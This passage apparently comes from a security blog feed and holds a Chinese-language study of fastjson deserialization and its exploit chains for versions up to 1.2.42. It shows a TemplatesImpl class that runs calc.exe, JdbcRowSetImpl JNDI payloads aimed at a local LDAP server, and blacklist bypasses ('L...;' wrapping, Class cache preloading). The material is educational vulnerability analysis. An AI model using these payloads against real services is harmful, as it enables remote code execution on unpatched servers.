alt="image-20230511210810954"></p><p>上面这个switch分支的代码，不会调用<code>readClassDesc</code>的分支有<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code></p><p>所以思路是放两个类进去，并且第二个类必须是<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code>中的一个，这里利用引用类型（因为其他类型要么毫无用处，要么用于解决序列化终止相关）</p><h3 id="引用类型的利用"><a href="#引用类型的利用" class="headerlink" title="引用类型的利用"></a>引用类型的利用</h3><p>当向List、set、map类型中添加同样对象时即可成功利用，这里也简单提一下，这里以List为例，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList&lt;Object&gt; arrayList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>arrayList.add(templates);<br>arrayList.add(templates);<br>writeObjects(arrayList);<br></code></pre></td></tr></table></figure><p>当我们写入同样的对象时，第二个会变成引用类型</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032239655.png" alt="image-20230511211004050"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson学习</title>
      <link href="/2023/02/01/fastjson%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/02/01/fastjson%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson学习"><a href="#fastjson学习" class="headerlink" title="fastjson学习"></a>fastjson学习</h1><p>fastjson组件可以类对象序列化成json字符串，再通过JSON.parse、JSON.parseObject等方法反序列化成类对象</p><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><ul><li>JSONObject</li><li>JSONArray</li></ul><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><span class="hljs-comment">//序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user); <br>System.out.println(serializedStr);<br><span class="hljs-comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parse(serializedStr); <br>System.out.println(<span class="hljs-string">&quot;parse反序列化对象名称:&quot;</span>+obj1.getClass().getName()); System.out.println(<span class="hljs-string">&quot;parse反序列化:&quot;</span>+obj1);<br><span class="hljs-comment">//通过parseObject,不指定类，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr); <br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj2.getClass().getName()); System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj2);<br><span class="hljs-comment">//通过parseObject,指定类后返回的是一个相应的类对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj3</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr,User.class); <br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj3.getClass().getName()); System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj3);<br><br><span class="hljs-comment">//@type</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>System.out.println(serializedStr);<br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr1</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(serializedStr1);<br>System.out.println(JSON.parse(serializedStr).getClass().toString());<br>System.out.println(JSON.parse(serializedStr1).getClass().toString());<br><br><span class="hljs-comment">//输出</span><br>有参构造<br>getId<br>getName&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>&#125;<br>parse反序列化对象名称:com.alibaba.fastjson.JSONObject<br>parse反序列化:&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>&#125;<br>parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject<br>parseObject反序列化:&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>&#125;<br>无参构造<br>setId<br>setName<br>parseObject反序列化对象名称:com.example.fastjson.User<br>parseObject反序列化:User&#123;name=<span class="hljs-string">&#x27;zhangsan&#x27;</span>, id=<span class="hljs-number">12</span>&#125;<br><span class="hljs-comment">//@type</span><br>getId<br>getName<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>&#125;<br>getId<br>getName<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.example.fastjson.User&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">12</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zhangsan&quot;</span>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.alibaba.fastjson.JSONObject<br>无参构造<br>setId<br>setName<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.example.fastjson.User<br></code></pre></td></tr></table></figure><blockquote><p>总结：</p><ul><li>要想反序列化后得到对应类型的类，需要使用parseObject并传入类的.class<ul><li>同时这样生成的序列化json字符串中会带有@type属性，存储着对应的类完整包路径</li></ul></li><li>parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li><li>调用toJSONString镜像序列化的时候，会调用getter</li><li>不指定@type不会调用<strong>构造方法</strong>和<strong>setter</strong></li><li>指定@type时，parse只会调用<strong>构造方法</strong>和特定setter，而parseObject会额外调用getter</li></ul></blockquote><h3 id="public-x2F-private属性区别"><a href="#public-x2F-private属性区别" class="headerlink" title="public&#x2F;private属性区别"></a>public&#x2F;private属性区别</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-comment">//属性</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> String full_name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean sex;<br>    <span class="hljs-keyword">private</span> Properties prop; <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Person构造函数&quot;</span>); &#125;<br>    <span class="hljs-comment">//set</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-comment">//get 返回Boolean</span><br>    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">getSex</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getSex()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.sex;<br>    &#125;<br>    <span class="hljs-comment">//get 返回ProPerties</span><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getProp</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getProp()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.prop;<br>    &#125;<br>    <span class="hljs-comment">//在输出时会自动调用的对象ToString函数 </span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[Person Object] name=&quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; full_name=&quot;</span> +<br>            <span class="hljs-built_in">this</span>.full_name  + <span class="hljs-string">&quot;, age=&quot;</span> + <span class="hljs-built_in">this</span>.age + <span class="hljs-string">&quot;, prop=&quot;</span> + <span class="hljs-built_in">this</span>.prop + <span class="hljs-string">&quot;, sex=&quot;</span> +<br>            <span class="hljs-built_in">this</span>.sex;<br>        <span class="hljs-keyword">return</span> s; <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试序列化与反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">eneity3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson.Person\&quot;,\&quot;name\&quot;:\&quot;zhang\&quot;, \&quot;full_name\&quot;:\&quot;zhangsan\&quot;, \&quot;age\&quot;: 18, \&quot;prop\&quot;: &#123;\&quot;123\&quot;:123&#125;, \&quot;sex\&quot;: 1&#125;&quot;</span>;<br><span class="hljs-comment">//反序列化</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(eneity3,Person.class); <span class="hljs-comment">//输出会调用obj对象的toString函数</span><br>System.out.println(obj);    <br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Person构造函数<br>setAge()<br>getProp()<br>[Person Object] name=zhang full_name=<span class="hljs-literal">null</span>, age=<span class="hljs-number">18</span>, prop=<span class="hljs-literal">null</span>, sex=<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><blockquote><p>从结果来看，成功通过反序列化赋值的属性只有name和age，而其中name因为是public因此可以直接赋值，full_name、sex、prop等private属性因为没有设置setter因此也赋值失败，age虽为private属性，但<code>public void setAge(int age)</code>被调用成功，因此被赋值</p><p>private sex getsex函数没有被调用,private prop getprop函数被成功调用</p><p>总结：</p><ul><li>反序列化赋值时，public属性直接赋值，private属性要调用setter</li><li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li></ul></blockquote><h3 id="parse过程"><a href="#parse过程" class="headerlink" title="parse过程"></a>parse过程</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241845.png" alt="image-20230810202238068"></p><h4 id="该过程中调用的setter方法要求"><a href="#该过程中调用的setter方法要求" class="headerlink" title="该过程中调用的setter方法要求"></a>该过程中调用的setter方法要求</h4><ul><li>方法名长度大于4且以set开头，且第四个字母要是大写</li><li>非静态方法</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><blockquote><p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名。再去跟这个类的属性去比对有没有这个名称的属性。</p><p>如果没有这个属性并且这个set方法的输入是一个布尔型，会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写(即isNa)，去寻找这个属性名。</p></blockquote><h4 id="该过程中调用的getter方法要求"><a href="#该过程中调用的getter方法要求" class="headerlink" title="该过程中调用的getter方法要求"></a>该过程中调用的getter方法要求</h4><ul><li>方法名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Fastjson-lt-x3D-1-2-24"><a href="#Fastjson-lt-x3D-1-2-24" class="headerlink" title="Fastjson&lt;&#x3D;1.2.24"></a>Fastjson&lt;&#x3D;1.2.24</h2><h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a><strong>TemplatesImpl</strong>利用链</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol><li><p>服务端使用parseObject()时，必须使用如下格式才能触发漏洞: JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</p></li><li><p>服务端使用parse()时，需要 JSON.parse(text1,Feature.SupportNonPublicField);</p></li></ol><blockquote><p>这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private 属性，服务端必须添加特性才回去从json中恢复private属性的数据。</p></blockquote><p>总体来说是直接反序列化TemplatesImpl,由于存在 Feature.SupportNonPublicField 设置(允许private对象传入)，反序列化的过程中会调用setValue，这里会把所有属性存储到filedInfo中，到outputProperties的时候，因为它是个类，存在 method，于是进入if分支，调用方法为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241981.png" alt="image-20230810204820756"></p><p>之后会调用newTransformer()</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241346.png" alt="image-20230810204854867"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241715.png" alt="image-20230810204903707"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241200.png" alt="image-20230810204916936"></p><blockquote><p>最后就是初始化类进而代码执行了</p></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Shell</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>&#125; &#125;<br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span><br>TransletException &#123;<br>&#125;<br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>&#125; &#125;<br></code></pre></td></tr></table></figure><p>工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">FiletoBase64</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filename);<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">io</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10240</span>];<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-keyword">while</span> ((len = io.read(buf)) &gt; <span class="hljs-number">0</span>) &#123;<br>        os.write(buf, <span class="hljs-number">0</span>, len);<br>    &#125;<br>    io.close();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(os.toByteArray());<br><span class="hljs-keyword">return</span> s; &#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> ClassBase64Util.FiletoBase64(<span class="hljs-string">&quot;./Shell.class&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;<br>System.out.println(payload1);<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);<br>System.out.println(obj);<br></code></pre></td></tr></table></figure><h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a><strong>JdbcRowSetImpl利用链</strong></h3><p>利用链分析:在设置AutoCommit属性时，调用setAutoCommit()方法，conn默认为空，进入else执行this.conn &#x3D; this.connect();</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241111.png" alt="image-20230810205442293"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032242017.png" alt="image-20230810205413334"></p><p>conn默认为空，若this.getDataSourceName() !&#x3D; null则进入else if,调用至 lookup(this.getDataSourceName()</p><p>故此处存在JNDI注入，payload为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-25-lt-x3D-Fastjson-lt-x3D-1-2-41"><a href="#1-2-25-lt-x3D-Fastjson-lt-x3D-1-2-41" class="headerlink" title="1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.41"></a>1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.41</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>开启autoTypeSupport,影响版本1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</p><h3 id="版本分析"><a href="#版本分析" class="headerlink" title="版本分析"></a>版本分析</h3><p>FastJSON1.2.24</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="hljs-built_in">this</span>.config.getDefaultClassLoader());<br></code></pre></td></tr></table></figure><p>FastJSON1.2.25</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = <span class="hljs-built_in">this</span>.config.checkAutoType(ref, (Class)<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><blockquote><p>加载类从TypeUtils.loadClass 变成了this.config.checkAutoType</p></blockquote><p>同时在1.2.25后<code>com.alibaba.fastjson.parser.ParserConfig</code>类加了属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> autoTypeSupport; <span class="hljs-comment">//控制是否可进行反序列化，默认为false</span><br><span class="hljs-keyword">private</span> String[] denyList; <span class="hljs-comment">//黑名单</span><br><span class="hljs-keyword">private</span> String[] acceptList; <span class="hljs-comment">//白名单</span><br></code></pre></td></tr></table></figure><blockquote><p>黑白名单在构造方法中赋值</p></blockquote><p>反序列化中也使用了<code>ParserConfig#checkAutoType()</code>,下图为com.alibaba.fastjson.parser.DefaultJSONParser中parseObject()方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032242548.png" alt="image-20230810210025230"></p><p>checkAutoType()中对autoTypeSupport进行判断</p><ul><li>若为true则先进行白名单校验，若为白名单内则进 入TypeUtils.loadClass，后再进行黑名单校验，若在黑名单中则抛出异常(autoType is not support …)，若未在黑名单中则在Map中查找类</li><li>若autoTypeSupport为false,则进行黑名单判断，再进行白名单判断，最后若autoTypeSupport&#x3D;true， 会再一次进行判断然后进入到TypeUtils.loadClass中</li></ul><p>com.alibaba.fastjson.util.TypeUtils#loadClass()中对[ L ;进行了处理，而其中在处理L ;的时候存在了逻 辑漏洞，可以在className的前后分别加上L ;来进行绕过</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032242965.png" alt="image-20230810211123310"></p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:13 89/Basic/Command/calc&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>利用条件</p><ul><li>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport</li><li>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.347 autoTypeSupport开启或未开启均可利用<ul><li>checkAutoType源码修改，若autoTypeSupport为true,当目标类在黑名单中，需要目标类不在map中才 会抛出异常</li></ul></li></ul><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>其实就是传两个对象，解析两次，解析完第一个对象时会把com.sun.rowset.JdbcRowSetImpl驾到缓存map中，第二次时就可以直接获取到目标类</p><p>A的解释</p><ul><li><p>在MiscCodec#deserialze()方法中，会解析strVal(对应val的值),当clazz &#x3D;&#x3D; Class.class，调用 TypeUtils.loadClass(),此时strVal为val对应值,这样就可以把val中的类加载到缓存map（mappings）中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == Class.class) &#123; <span class="hljs-comment">//当clazz == Class.class，调用 TypeUtils.loadClass(),此时strVal为val对应值</span><br><span class="hljs-keyword">return</span> TypeUtils.loadClass(strVal,parser.getConfig().getDefaultClassLoader());<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></blockquote><h2 id="Fastjson-x3D-1-2-42"><a href="#Fastjson-x3D-1-2-42" class="headerlink" title="Fastjson &#x3D; 1.2.42"></a><strong>Fastjson &#x3D; 1.2.42</strong></h2><h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><p>Fastjson &lt;&#x3D; 1.2.42 开启autoTypeSupport</p><p>Fastjson1.2.42将黑名单由字符串直接比对改为了HashCode。checkAutoType()中在黑名单绕过的时候 